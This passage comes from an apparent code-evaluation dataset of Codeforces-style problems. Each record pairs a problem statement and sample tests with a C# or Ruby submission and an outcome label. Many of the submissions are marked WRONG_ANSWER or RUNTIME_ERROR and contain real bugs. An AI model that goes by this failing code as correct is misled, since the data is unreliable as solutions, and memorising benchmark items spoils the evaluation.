else\n                l = mid;\n        }\n\n        Console.WriteLine(r);\n    }\n\n    private const int Mod = 1000000000 + 7;\n\n    #region Data Read\n    private static char ReadSign()\n    {\n        while (true)\n        {\n            int ans = consoleReader.Read();\n            if (ans == '+' || ans == '-' || ans == '?')\n                return (char)ans;\n        }\n    }\n\n    private static long GCD(long a, long b)\n    {\n        if (a % b == 0) return b;\n        return GCD(b, a % b);\n    }\n\n    private static List<int>[] ReadGraph(int n, int m)\n    {\n        List<int>[] g = new List<int>[n];\n        for (int i = 0; i < g.Length; i++) g[i] = new List<int>();\n        for (int i = 0; i < m; i++)\n        {\n            int a = RI() - 1;\n            int b = RI() - 1;\n\n            g[a].Add(b);\n            g[b].Add(a);\n        }\n\n        return g;\n    }\n\n    private static int[,] ReadGraphAsMatrix(int n, int m)\n    {\n        int[,] matrix = new int[n + 1, n + 1];\n        for (int i = 0; i < m; i++)\n        {\n            int a = RI();\n            int b = RI();\n            matrix[a, b] = matrix[b, a] = 1;\n        }\n\n        return matrix;\n    }\n\n    private static void Sort(ref int a, ref int b)\n    {\n        if (a > b) Swap(ref a, ref b);\n    }\n\n    private static void Swap(ref int a, ref int b)\n    {\n        int tmp = a;\n        a = b;\n        b = tmp;\n    }\n\n    private const int BufferSize = 1 << 16;\n    private static StreamReader consoleReader;\n    private static MemoryStream testData;\n\n    private static int RI()\n    {\n        int ans = 0;\n        int mul = 1;\n        do\n        {\n            ans = consoleReader.Read();\n            if (ans == -1)\n                return 0;\n            if (ans == '-') mul = -1;\n        } while (ans < '0' || ans > '9');\n\n        ans -= '0';\n        while (true)\n        {\n            int chr = consoleReader.Read();\n            if (chr < '0' || chr > '9')\n                return ans * mul;\n            ans = ans * 10 + chr - '0';\n        }\n    }\n\n    private static ulong RUL()\n    {\n        ulong ans = 0;\n        int chr;\n        do\n        {\n            chr = consoleReader.Read();\n            if (chr == -1)\n                return 0;\n        } while (chr < '0' || chr > '9');\n\n        ans = (uint)(chr - '0');\n        while (true)\n        {\n            chr = consoleReader.Read();\n            if (chr < '0' || chr > '9')\n                return ans;\n            ans = ans * 10 + (uint)(chr - '0');\n        }\n    }\n\n    private static long RL()\n    {\n        long ans = 0;\n        int mul = 1;\n        do\n        {\n            ans = consoleReader.Read();\n            if (ans == -1)\n                return 0;\n            if (ans == '-') mul = -1;\n        } while (ans < '0' || ans > '9');\n\n        ans -= '0';\n        while (true)\n        {\n            int chr = consoleReader.Read();\n            if (chr < '0' || chr > '9')\n                return ans * mul;\n            ans = ans * 10 + chr - '0';\n        }\n    }\n\n    private static int[] RIA(int n)\n    {\n        int[] ans = new int[n];\n        for (int i = 0; i < n; i++)\n            ans[i] = RI();\n        return ans;\n    }\n\n    private static long[] RLA(int n)\n    {\n        long[] ans = new long[n];\n        for (int i = 0; i < n; i++)\n            ans[i] = RL();\n        return ans;\n    }\n\n    private static char[] ReadWord()\n    {\n        int ans;\n\n        do\n        {\n            ans = consoleReader.Read();\n        } while (!((ans >= 'a' && ans <= 'z') || (ans >= 'A' && ans <= 'Z')));\n\n        List<char> s = new List<char>();\n        do\n        {\n            s.Add((char)ans);\n            ans = consoleReader.Read();\n        } while ((ans >= 'a' && ans <= 'z') || (ans >= 'A' && ans <= 'Z'));\n\n        return s.ToArray();\n    }\n\n    private static char[] ReadString(int n)\n    {\n        int ans;\n\n        do\n        {\n            ans = consoleReader.Read();\n        } while (!((ans >= 'a' && ans <= 'z') || (ans >= 'A' && ans <= 'Z')));\n\n        char[] s = new char[n];\n        int pos = 0;\n        do\n        {\n            s[pos++] = (char)ans;\n            if (pos == n) break;\n            ans = consoleReader.Read();\n        } while ((ans >= 'a' && ans <= 'z') || (ans >= 'A' && ans <= 'Z'));\n\n        return s;\n    }\n\n    private static char[] ReadStringLine()\n    {\n        int ans;\n\n        do\n        {\n            ans = consoleReader.Read();\n        } while (ans == 10 || ans == 13);\n\n        List<char> s = new List<char>();\n\n        do\n        {\n            s.Add((char)ans);\n            ans = consoleReader.Read();\n        } while (ans != 10 && ans != 13 && ans != -1);\n\n        return s.ToArray();\n    }\n\n    private static char ReadLetter()\n    {\n        while (true)\n        {\n            int ans = consoleReader.Read();\n            if ((ans >= 'a' && ans <= 'z') || (ans >= 'A' && ans <= 'Z'))\n                return (char)ans;\n        }\n    }\n    private static char ReadNonLetter()\n    {\n        while (true)\n        {\n            int ans = consoleReader.Read();\n            if (!((ans >= 'a' && ans <= 'z') || (ans >= 'A' && ans <= 'Z')))\n                return (char)ans;\n        }\n    }\n\n    private static char ReadAnyOf(IEnumerable<char> allowed)\n    {\n        while (true)\n        {\n            char ans = (char)consoleReader.Read();\n            if (allowed.Contains(ans))\n                return ans;\n        }\n    }\n\n    private static char ReadDigit()\n    {\n        while (true)\n        {\n            int ans = consoleReader.Read();\n            if (ans >= '0' && ans <= '9')\n                return (char)ans;\n        }\n    }\n\n    private static int ReadDigitInt()\n    {\n        return ReadDigit() - (int)'0';\n    }\n\n    private static char ReadAnyChar()\n    {\n        return (char)consoleReader.Read();\n    }\n\n    private static string DoubleToString(double x)\n    {\n        return x.ToString(CultureInfo.InvariantCulture);\n    }\n\n    private static double DoubleFromString(string x)\n    {\n        return double.Parse(x, CultureInfo.InvariantCulture);\n    }\n\n    static Program()\n    {\n        \/\/Thread.CurrentThread.CurrentCulture = CultureInfo.InvariantCulture;\n        consoleReader = new StreamReader(Console.OpenStandardInput(BufferSize), Encoding.ASCII, false, BufferSize);\n    }\n\n    private static void PushTestData(StringBuilder sb)\n    {\n        PushTestData(sb.ToString());\n    }\n    private static void PushTestData(string data)\n    {\n#if TOLYAN_TEST\n        if (testData == null)\n        {\n            testData = new MemoryStream();\n            consoleReader = new StreamReader(testData);\n        }\n\n        var pos = testData.Position;\n        var bytes = Encoding.UTF8.GetBytes(data);\n        testData.Write(bytes, 0, bytes.Length);\n        testData.Flush();\n        testData.Position = pos;\n#endif\n    }\n    #endregion\n}","description":"Polycarp's workday lasts exactly $$$n$$$ minutes. He loves chocolate bars and can eat one bar in one minute. Today Polycarp has $$$k$$$ bars at the beginning of the workday.In some minutes of the workday Polycarp has important things to do and in such minutes he is not able to eat a chocolate bar. In other minutes he can either eat or not eat one chocolate bar. It is guaranteed, that in the first and in the last minutes of the workday Polycarp has no important things to do and he will always eat bars in this minutes to gladden himself at the begining and at the end of the workday. Also it is guaranteed, that $$$k$$$ is strictly greater than $$$1$$$.Your task is to determine such an order of eating chocolate bars that the maximum break time between eating bars is as minimum as possible.Consider that Polycarp eats a bar in the minute $$$x$$$ and the next bar in the minute $$$y$$$ ($$$x &lt; y$$$). Then the break time is equal to $$$y - x - 1$$$ minutes. It is not necessary for Polycarp to eat all bars he has.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers $$$n$$$ and $$$k$$$ ($$$2 \\le n \\le 200\\,000$$$, $$$2 \\le k \\le n$$$) \u2014 the length of the workday in minutes and the number of chocolate bars, which Polycarp has in the beginning of the workday. The second line contains the string with length $$$n$$$ consisting of zeros and ones. If the $$$i$$$-th symbol in the string equals to zero, Polycarp has no important things to do in the minute $$$i$$$ and he can eat a chocolate bar. In the other case, Polycarp is busy in the minute $$$i$$$ and can not eat a chocolate bar. It is guaranteed, that the first and the last characters of the string are equal to zero, and Polycarp always eats chocolate bars in these minutes.","output_spec":"Print the minimum possible break in minutes between eating chocolate bars.","notes":"NoteIn the first example Polycarp can not eat the chocolate bar in the second minute, so the time of the break equals to one minute.In the second example Polycarp will eat bars in the minutes $$$1$$$ and $$$8$$$ anyway, also he needs to eat the chocolate bar in the minute $$$5$$$, so that the time of the maximum break will be equal to $$$3$$$ minutes.","sample_inputs":["3 3\n010","8 3\n01010110"],"sample_outputs":["1","3"]}
{"difficulty":1800,"lang":"Mono C#","lang_cluster":"c#","src_uid":"e9c486e2d942700e0644dff29b6e3be6","submission_id":"re_769","tags":["implementation","greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"using System;\nusing System.Collections.Generic;\n\nnamespace Task2\n{\n    class Program\n    {\n        private struct Spell\n        {\n            public int N;\n            public int pow;\n            public int dmg;\n\n            public static Spell NullSpell\n            {\n                get { return new Spell() {N = -1, dmg = -1, pow = -1}; }\n            }\n        }\n\n        private struct Cast\n        {\n\n            public int time;\n            public int spell;\n        }\n\n        static void Main(string[] args)\n        {\n            string line;\n\n            line = Console.ReadLine();\n            string[] arg1 = line.Split();\n\n            int N = int.Parse(arg1[0]);\n            int max = int.Parse(arg1[1]);\n            int reg = int.Parse(arg1[2]);\n\n            List<Spell> spells = new List<Spell>();\n\n            for (int i = 0; i < N; i++)\n            {\n                line = Console.ReadLine();\n                string[] arg2 = line.Split();\n\n                int pow = int.Parse(arg2[0]);\n                int dmg = int.Parse(arg2[1]);\n\n                spells.Add(new Spell() {N = i + 1, pow = pow, dmg = dmg});\n            }\n\n            spells.Sort( (x, y) => y.dmg.CompareTo(x.dmg)); \/\/sort desc\n\n            List<Cast> usedSpells = new List<Cast>();\n\n            int currentDmg = 0;\n            int currentHp = max;\n            int currentTime = 0;\n\n            do\n            {\n                currentHp -= currentDmg;\n\n                currentHp += reg;\n                if (currentHp > max)\n                    currentHp = max;\n\n                Spell spell = GetBestSpell(currentHp, max, spells);\n                if (spell.Equals(Spell.NullSpell))\n                {\n                    if (reg >= currentDmg && currentHp > 0)\n                    {\n                        OutNoSolution();\n                        return;\n                    }\n                }\n                else\n                {\n                    currentDmg += spell.dmg;\n                    spells.Remove(spell);\n\n                    usedSpells.Add(new Cast() {spell = spell.N, time = currentTime});\n                }\n\n                if (currentHp <= 0)\n                {\n                    OutSolution(usedSpells, currentTime);\n                    return;\n                }\n\n                currentTime++;\n            } while (true);\n        }\n\n        private static void OutNoSolution()\n        {\n            Console.WriteLine(\"NO\");\n\n        }\n\n        private static void OutSolution(List<Cast> usedSpells, int time)\n        {\n            Console.WriteLine(\"YES\");\n            Console.WriteLine(\"{0} {1}\", time, usedSpells.Count);\n\n            foreach (var cast in usedSpells)\n            {\n                Console.WriteLine(\"{0} {1}\", cast.time, cast.spell);\n            }\n        }\n\n        private static Spell GetBestSpell(int currentHp, int max, List<Spell> spells)\n        {\n            for (int i = 0; i < spells.Count; i++)\n                if ((long)currentHp * 100 <= (long)spells[i].pow * max)\n                {\n                    return spells[i];\n                }\n\n            return Spell.NullSpell;\n        }\n    }\n}\n","description":"Vasya\u2019s elder brother Petya loves playing computer games. In one of his favourite computer games Petya reached the final level where a fight with the boss take place.While playing the game Petya found spell scrolls and now he is about to use them. Let\u2019s describe the way fighting goes on this level:1) The boss has two parameters: max \u2014 the initial amount of health and reg \u2014 regeneration rate per second.2) Every scroll also has two parameters: powi \u2014 spell power measured in percents \u2014 the maximal amount of health counted off the initial one, which allows to use the scroll (i.e. if the boss has more than powi percent of health the scroll cannot be used); and dmgi the damage per second inflicted upon the boss if the scroll is used. As soon as a scroll is used it disappears and another spell is cast upon the boss that inflicts dmgi of damage per second upon him until the end of the game.During the battle the actions per second are performed in the following order: first the boss gets the damage from all the spells cast upon him, then he regenerates reg of health (at the same time he can\u2019t have more than max of health), then the player may use another scroll (no more than one per second).The boss is considered to be defeated if at the end of a second he has nonpositive (\u2009\u2264\u20090) amount of health.Help Petya to determine whether he can win with the set of scrolls available to him and if he can, determine the minimal number of seconds he needs to do it.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integers N, max and reg (1\u2009\u2264\u2009N,\u2009max,\u2009reg\u2009\u2264\u20091000) \u2013\u2013 the amount of scrolls and the parameters of the boss. The next N lines contain two integers powi and dmgi each \u2014 the parameters of the i-th scroll (0\u2009\u2264\u2009powi\u2009\u2264\u2009100, 1\u2009\u2264\u2009dmgi\u2009\u2264\u20092000). ","output_spec":"In case Petya can\u2019t complete this level, output in the single line NO. Otherwise, output on the first line YES. On the second line output the minimal time after which the boss can be defeated and the number of used scrolls. In the next lines for each used scroll output space-separated number of seconds passed from the start of the battle to the moment the scroll was used and the number of the scroll. Scrolls are numbered starting from 1 in the input order. The first scroll is considered to be available to be used after 0 seconds. Output scrolls in the order they were used. It is not allowed to use scrolls after the boss is defeated.","notes":null,"sample_inputs":["2 10 3\n100 3\n99 1","2 100 10\n100 11\n90 9"],"sample_outputs":["NO","YES\n19 2\n0 1\n10 2"]}
{"difficulty":2200,"lang":"Mono C#","lang_cluster":"c#","src_uid":"fc29e8c1a9117c1dd307131d852b6088","submission_id":"8da97d0cb6dee7c51065cf164f3a8fbb","tags":["binary search","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"using System;\nusing System.Collections;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.IO;\nusing System.Text;\nusing System.Globalization;\nusing System.Diagnostics;\nusing System.Numerics;\n\n\n\nclass Myon\n{\n    public Myon() { }\n    public static int Main()\n    {\n        new Myon().calc();\n        return 0;\n    }\n\n    Scanner cin;\n    \n\n    void calc()\n    {\n        cin = new Scanner();\n        int N = cin.nextInt();\n        long[] A = new long[N];\n        int count1 = 0;\n        for (int i = 0; i < N; i++)\n        {\n            A[i] = cin.nextLong();\n            if (A[i] == 1) count1++;\n        }\n        Array.Sort(A);\n\n        int MAX = 200000;\n\n        int ok = MAX;\n        int ng = 0;\n\n        long[] NGar = new long[N];\n        long[] OKar = new long[N];\n        int NGcnt, OKcnt;\n\n        while(ok - ng > 1)\n        {\n            int mid = (ok + ng) \/ 2;\n            long p2Num = 0;\n            int p2 = mid;\n\n            long preNum = 1;\n            int pre = 0;\n            bool flag = true;\n            NGcnt = OKcnt = 0;\n\n            foreach (var now in A)\n            {\n                while(now > preNum)\n                {\n                    if (p2Num != 0)\n                    {\n                        for (int i = 0; i < p2; i++)\n                        {\n                            OKar[OKcnt++] = p2Num;\n                        }\n                    }\n                    p2 = pre;\n                    p2Num = preNum;\n                    pre = 0;\n                    preNum *= 2;\n                }\n                if(p2 >= 1 && now == preNum)\n                {\n                    pre++;\n                    p2--;\n                }\n                else\n                {\n                    NGar[NGcnt++] = now;\n                }\n\n            }\n\n            for (int i = 0; i < p2; i++)\n            {\n                OKar[OKcnt++] = p2Num;\n            }\n            for (int i = 0; i < pre; i++)\n            {\n                OKar[OKcnt++] = preNum;\n            }\n\n            int o = 0;\n            int nn = 0;\n            while(o < OKcnt && nn < NGcnt)\n            {\n                if (OKar[o] * 2 >= NGar[nn]) nn++;\n                o++;\n            }\n\n            if (nn < NGcnt) flag = false;\n\n            if (flag) ok = mid;\n            else  ng = mid;\n        }\n\n        if (ok == MAX) Console.WriteLine(-1);\n        else\n        {\n            for (int i = ok; i <= count1; i++)\n            {\n                Console.Write(i + \" \");\n            }\n            Console.WriteLine();\n        }\n    }\n}\n\nclass Scanner\n{\n    string[] s;\n    int i;\n\n    char[] cs = new char[] { ' ' };\n\n    public Scanner()\n    {\n        s = new string[0];\n        i = 0;\n    }\n\n    public string next()\n    {\n        if (i < s.Length) return s[i++];\n        string st = Console.ReadLine();\n        while (st == \"\") st = Console.ReadLine();\n        s = st.Split(cs, StringSplitOptions.RemoveEmptyEntries);\n        i = 0;\n        return s[i++];\n    }\n\n    public int nextInt()\n    {\n        return int.Parse(next());\n    }\n\n    public long nextLong()\n    {\n        return long.Parse(next());\n    }\n\n    public double nextDouble()\n    {\n        return double.Parse(next());\n    }\n\n}","description":"It can be shown that any positive integer x can be uniquely represented as x\u2009=\u20091\u2009+\u20092\u2009+\u20094\u2009+\u2009...\u2009+\u20092k\u2009-\u20091\u2009+\u2009r, where k and r are integers, k\u2009\u2265\u20090, 0\u2009<;\u2009r\u2009\u2264\u20092k. Let's call that representation prairie partition of x.For example, the prairie partitions of 12, 17, 7 and 1 are:  12\u2009=\u20091\u2009+\u20092\u2009+\u20094\u2009+\u20095,17\u2009=\u20091\u2009+\u20092\u2009+\u20094\u2009+\u20098\u2009+\u20092,7\u2009=\u20091\u2009+\u20092\u2009+\u20094,1\u2009=\u20091. Alice took a sequence of positive integers (possibly with repeating elements), replaced every element with the sequence of summands in its prairie partition, arranged the resulting numbers in non-decreasing order and gave them to Borys. Now Borys wonders how many elements Alice's original sequence could contain. Find all possible options!","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009105)\u00a0\u2014 the number of numbers given from Alice to Borys. The second line contains n integers a1,\u2009a2,\u2009...,\u2009an (1\u2009\u2264\u2009ai\u2009\u2264\u20091012; a1\u2009\u2264\u2009a2\u2009\u2264\u2009...\u2009\u2264\u2009an)\u00a0\u2014 the numbers given from Alice to Borys.","output_spec":"Output, in increasing order, all possible values of m such that there exists a sequence of positive integers of length m such that if you replace every element with the summands in its prairie partition and arrange the resulting numbers in non-decreasing order, you will get the sequence given in the input. If there are no such values of m, output a single integer -1.","notes":"NoteIn the first example, Alice could get the input sequence from [6,\u200920] as the original sequence.In the second example, Alice's original sequence could be either [4,\u20095] or [3,\u20093,\u20093].","sample_inputs":["8\n1 1 2 2 3 4 5 8","6\n1 1 1 2 2 2","5\n1 2 4 4 4"],"sample_outputs":["2","2 3","-1"]}
{"difficulty":900,"lang":"Ruby","lang_cluster":"ruby","src_uid":"102667eaa3aee012fef70f4192464674","submission_id":"re_1233","tags":["implementation","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"require 'set'\nrequire 'rational'\nrequire 'mathn'\ninclude Math\n$stdin = File.open(\".\/input.txt\", \"r\") if ENV[\"USER\"] == \"new\"\n# ====================================\n\ngets\nfront = gets.split.map &:to_i\ngets\nback = gets.split.map &:to_i\n\nhash = Hash.new( 0 )\n\nfront_x.each{|v1|\n  back_x.each{|v2|\n    next if v1 % v2 != 0\n    \n    hash[back_x \/ front_x]+=1\n  }\n}","description":"Vasya's bicycle chain drive consists of two parts: n stars are attached to the pedal axle, m stars are attached to the rear wheel axle. The chain helps to rotate the rear wheel by transmitting the pedal rotation.We know that the i-th star on the pedal axle has ai (0\u2009&lt;\u2009a1\u2009&lt;\u2009a2\u2009&lt;\u2009...\u2009&lt;\u2009an) teeth, and the j-th star on the rear wheel axle has bj (0\u2009&lt;\u2009b1\u2009&lt;\u2009b2\u2009&lt;\u2009...\u2009&lt;\u2009bm) teeth. Any pair (i,\u2009j) (1\u2009\u2264\u2009i\u2009\u2264\u2009n;\u00a01\u2009\u2264\u2009j\u2009\u2264\u2009m) is called a gear and sets the indexes of stars to which the chain is currently attached. Gear (i,\u2009j) has a gear ratio, equal to the value .Since Vasya likes integers, he wants to find such gears (i,\u2009j), that their ratios are integers. On the other hand, Vasya likes fast driving, so among all \"integer\" gears (i,\u2009j) he wants to choose a gear with the maximum ratio. Help him to find the number of such gears.In the problem, fraction  denotes division in real numbers, that is, no rounding is performed.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains integer n (1\u2009\u2264\u2009n\u2009\u2264\u200950) \u2014 the number of stars on the bicycle's pedal axle. The second line contains n integers a1,\u2009a2,\u2009...,\u2009an (1\u2009\u2264\u2009ai\u2009\u2264\u2009104) in the order of strict increasing. The third input line contains integer m (1\u2009\u2264\u2009m\u2009\u2264\u200950) \u2014 the number of stars on the rear wheel axle. The fourth line contains m integers b1,\u2009b2,\u2009...,\u2009bm (1\u2009\u2264\u2009bi\u2009\u2264\u2009104) in the order of strict increasing. It is guaranteed that there exists at least one gear (i,\u2009j), that its gear ratio is an integer. The numbers on the lines are separated by spaces.","output_spec":"Print the number of \"integer\" gears with the maximum ratio among all \"integer\" gears.","notes":"NoteIn the first sample the maximum \"integer\" gear ratio equals 3. There are two gears that have such gear ratio. For one of them a1\u2009=\u20094,\u2009b1\u2009=\u200912, and for the other a2\u2009=\u20095,\u2009b3\u2009=\u200915.","sample_inputs":["2\n4 5\n3\n12 13 15","4\n1 2 3 4\n5\n10 11 12 13 14"],"sample_outputs":["2","1"]}
{"difficulty":1000,"lang":"Ruby 3","lang_cluster":"ruby","src_uid":"102_B","submission_id":"170420824","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"x=gets\r\ni = 0\r\nwhile x.size > 1 do\r\n  x=x.split('').map(&:to_i).sum.to_s\r\n  i+=1\r\nend\r\np i\r\n","description":"Having watched the last Harry Potter film, little Gerald also decided to practice magic. He found in his father's magical book a spell that turns any number in the sum of its digits. At the moment Gerald learned that, he came across a number n. How many times can Gerald put a spell on it until the number becomes one-digit?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the only integer n (0\u2264n\u226410^100000). It is guaranteed that n doesn't contain any leading zeroes.\n","output_spec":"Print the number of times a number can be replaced by the sum of its digits until it only contains one digit.\n","notes":"In the first sample the number already is one-digit \u2014 Herald can't cast a spell.\nThe second test contains number 10. After one casting of a spell it becomes 1, and here the process is completed. Thus, Gerald can only cast the spell once.\nThe third test contains number 991. As one casts a spell the following transformations take place: 991\u219219\u219210\u21921. After three transformations the number becomes one-digit.\n","sample_inputs":["0\n","10\n","991\n"],"sample_outputs":["0\n","1\n","3\n"]}
{"difficulty":1100,"lang":"Ruby 3","lang_cluster":"ruby","src_uid":"110_B","submission_id":"218761898","tags":["constructive+algorithms","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"def ga = gets.split.map!(&:to_i)\ndef gi = gets.to_i\ndef giga = [gi, ga]\ndef gigs = [gi, gs]\ndef gs = gets.strip\ndef gss = gs.split\ndef o(x) = puts(x)\ndef pa(a, d = ' ') = puts(a * d)\ndef pan(a) = pa(a, \"\\n\")\ndef yn(p) = p ? 'YES' : 'NO'\ndef ync(p) = p ? 'Yes' : 'No'\ndef hz(d = 0) = Hash.new(d)\ndef rqr(*a) = a.each { require _1 }\nclass Set def z = size end\nclass Array\n    def r! = reverse!\n    def f = first\n    def l = last\n    def sh = shift\n    def j(...) = join(...)\n    def pc = pack('c*')\n    def psum!(s = 0) = map! { s += _1 }\n    def lbound(x) = bsearch { _1 >= x }\n    def lbound_index(x) = bsearch_index { _1 >= x }\n    def hoare!(...) = shuffle!.sort!(...)\n    def z = size\nend\nmodule Enumerable\n    def e(...) = each(...)\n    def ei(...) = each_index(...)\n    def re(...) = reverse_each(...)\n    def ec(...) = each_cons(...)\n    def es(...) = each_slice(...)\n    def wo(...) = with_object(...)\n    def wi(...) = with_index(...)\n    def ewi(...) = each_with_index(...)\n    def ewo(...) = each_with_object(...)\n    def fold(...) = reduce(...)\nend\nclass String\n    def i(...) = to_i(...)\n    def e(...) = each_char(...)\n    def eb(...) = each_byte(...)\n    def b = bytes\n    def r = reverse\n    def z = size\nend\nclass Numeric\n    def f = to_f\n    def i = to_i\n    def s(...) = to_s(...)\n    def sqrt = Math.sqrt(self)\n    def isqrt = Integer.sqrt(self)\nend\nclass Integer\n    def p = pred\n    def n = succ\n    def t(...) = times(...)\n    def popcount = loop.reduce((raise if (x = self) < 0; 0)) \\\n        { | r | break r if x < 1; r += x & 1; x >>= 1; r }\n    def ctz = loop.reduce((raise if (x = self) <= 0; 0)) \\\n        { | r | break r if x[0] == 1; x >>= 1; r.n }\nend\nclass Hash\n    def ek(...) = each_key(...)\n    def ev(...) = each_value(...)\n    def kmin = ek.min\n    def kmax = ek.max\n    def vmin = ev.min\n    def vmax = ev.max\n    def d(...) = delete(...)\n    def z = size\nend\nclass MSet < Hash\n    def <<(x) = (self[x] = (self[x] || 0).n; self)\n    def d(x) = (self.delete x if (self[x] && self[x] -= 1) == 0)\nend\ndef fio(a = 'input.txt', b = 'output.txt')\n    $stdin = File.open a, 'rb'\n    $stdout = File.open b, 'wb'\nend\nrqr 'set', 'prime'\nclass Set def d(...) = delete(...) end\nclass Prime\n    def self.at_least(x) =\n        loop { Prime.prime?(x) ? (break x) : x += 1 }\nend\nRC = \/(.)\\1*\/\n\n################################################################\n#                                                              #\n#              https:\/\/github.com\/alantudyk\/Stop               #\n#                                                              #\n################################################################\n\no ('abcd' + ?a * 1e5)[...gi]\n\n################################################################\n#                                                              #\n#              https:\/\/github.com\/alantudyk\/Stop               #\n#                                                              #\n################################################################\n\n","description":"Petya loves lucky numbers. We all know that lucky numbers are the positive integers whose decimal representations contain only the lucky digits 4 and 7. For example, numbers 47, 744, 4 are lucky and 5, 17, 467 are not.Petya recently learned to determine whether a string of lowercase Latin letters is lucky. For each individual letter all its positions in the string are written out in the increasing order. This results in 26 lists of numbers; some of them can be empty. A string is considered lucky if and only if in each list the absolute difference of any two adjacent numbers is a lucky number. For example, let's consider string \"zbcdzefdzc\". The lists of positions of equal letters are: b: 2 c: 3,10 d: 4,8 e: 6 f: 7 z: 1,5,9 Lists of positions of letters a, g, h, ..., y are empty.This string is lucky as all differences are lucky numbers. For letters z: 5-1=4, 9-5=4, for letters c: 10-3=7, for letters d: 8-4=4. Note that if some letter occurs only once in a string, it doesn't influence the string's luckiness after building the lists of positions of equal letters. The string where all the letters are distinct is considered lucky.Find the lexicographically minimal lucky string whose length equals n.","input_from":"standard input","output_to":"standard output","input_spec":"The single line contains a positive integer n (1\u2264n\u226410^5) \u2014 the length of the sought string.\n","output_spec":"Print on the single line the lexicographically minimal lucky string whose length equals n.\n","notes":"The lexical comparison of strings is performed by the < operator in modern programming languages. String a is lexicographically less than string b if exists such i (1\u2264i\u2264n), that ai<bi, and for any j (1\u2264j<i) aj=bj.\n","sample_inputs":["5\n","3\n"],"sample_outputs":["abcda\n","abc\n"]}
{"difficulty":1200,"lang":"Ruby","lang_cluster":"ruby","src_uid":"15fa49860e978d3b3fb7a20bf9f8aa86","submission_id":"re_716","tags":["implementation","geometry","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"n, vb, vs = gets.split.map{|i| i.to_f}\nx = gets.split.map{|i| i.to_i}\nxu, yu = gets.split.map{|i| i.to_i}\nans = [1e100, -1, -1]\n1.upto(x.length - 1) do |i|\n\td = (xu - x[i]) ** 2 + yu ** 2\n\tt = x[i] \/ vb + Math.sqrt(d) \/ vs\n\tans = [d, t, i] if t < ans[0] - 1e-8 || (t < ans[0] + 1e-8 && d < ans[1])\nend\np ans[2] + 1\n","description":"And again a misfortune fell on Poor Student. He is being late for an exam.Having rushed to a bus stop that is in point (0,\u20090), he got on a minibus and they drove along a straight line, parallel to axis OX, in the direction of increasing x.Poor Student knows the following:   during one run the minibus makes n stops, the i-th stop is in point (xi,\u20090)  coordinates of all the stops are different  the minibus drives at a constant speed, equal to vb  it can be assumed the passengers get on and off the minibus at a bus stop momentarily  Student can get off the minibus only at a bus stop  Student will have to get off the minibus at a terminal stop, if he does not get off earlier  the University, where the exam will be held, is in point (xu,\u2009yu)  Student can run from a bus stop to the University at a constant speed vs as long as needed  a distance between two points can be calculated according to the following formula:   Student is already on the minibus, so, he cannot get off at the first bus stop Poor Student wants to get to the University as soon as possible. Help him to choose the bus stop, where he should get off. If such bus stops are multiple, choose the bus stop closest to the University.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integer numbers: 2\u2009\u2264\u2009n\u2009\u2264\u2009100, 1\u2009\u2264\u2009vb,\u2009vs\u2009\u2264\u20091000. The second line contains n non-negative integers in ascending order: coordinates xi of the bus stop with index i. It is guaranteed that x1 equals to zero, and xn\u2009\u2264\u2009105. The third line contains the coordinates of the University, integers xu and yu, not exceeding 105 in absolute value. ","output_spec":"In the only line output the answer to the problem \u2014 index of the optimum bus stop.","notes":"NoteAs you know, students are a special sort of people, and minibuses usually do not hurry. That's why you should not be surprised, if Student's speed is higher than the speed of the minibus.","sample_inputs":["4 5 2\n0 2 4 6\n4 1","2 1 1\n0 100000\n100000 100000"],"sample_outputs":["3","2"]}
{"difficulty":1200,"lang":"Ruby","lang_cluster":"ruby","src_uid":"1ae2942b72ebb7c55359c41e141900d7","submission_id":"re_1274","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"gets\nbats = gets.split.map &:to_i\nprizes = gets.split.map &:to_i\nscore = 0\nres = prizes.map{0}\nfor bat in bats\n    score += bat\n\n    can = prizes.select{ |prize| prize <= score }\n    break if can.empty?\n    res[prizes.index(can.max)] += score \/ can.max\n    score %= can.max\n    \nend\nputs res.join \" \"\nputs score","description":"Vasya, like many others, likes to participate in a variety of sweepstakes and lotteries. Now he collects wrappings from a famous chocolate bar \"Jupiter\". According to the sweepstake rules, each wrapping has an integer written on it \u2014 the number of points that the participant adds to his score as he buys the bar. After a participant earns a certain number of points, he can come to the prize distribution center and exchange the points for prizes. When somebody takes a prize, the prize's cost is simply subtracted from the number of his points.Vasya didn't only bought the bars, he also kept a record of how many points each wrapping cost. Also, he remembers that he always stucks to the greedy strategy \u2014 as soon as he could take at least one prize, he went to the prize distribution centre and exchanged the points for prizes. Moreover, if he could choose between multiple prizes, he chose the most expensive one. If after an exchange Vasya had enough points left to get at least one more prize, then he continued to exchange points.The sweepstake has the following prizes (the prizes are sorted by increasing of their cost):   a mug (costs a points),  a towel (costs b points),  a bag (costs c points),  a bicycle (costs d points),  a car (costs e points). Now Vasya wants to recollect what prizes he has received. You know sequence p1,\u2009p2,\u2009...,\u2009pn, where pi is the number of points Vasya got for the i-th bar. The sequence of points is given in the chronological order. You also know numbers a, b, c, d, e. Your task is to find, how many prizes Vasya received, what prizes they are and how many points he's got left after all operations are completed.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u200950) \u2014 the number of chocolate bar wrappings that brought points to Vasya. The second line contains space-separated integers p1,\u2009p2,\u2009...,\u2009pn (1\u2009\u2264\u2009pi\u2009\u2264\u2009109). The third line contains 5 integers a, b, c, d, e (1\u2009\u2264\u2009a\u2009&lt;\u2009b\u2009&lt;\u2009c\u2009&lt;\u2009d\u2009&lt;\u2009e\u2009\u2264\u2009109) \u2014 the prizes' costs.","output_spec":"Print on the first line 5 integers, separated by a space \u2014 the number of mugs, towels, bags, bicycles and cars that Vasya has got, respectively. On the second line print a single integer \u2014 the number of points Vasya will have left after all operations of 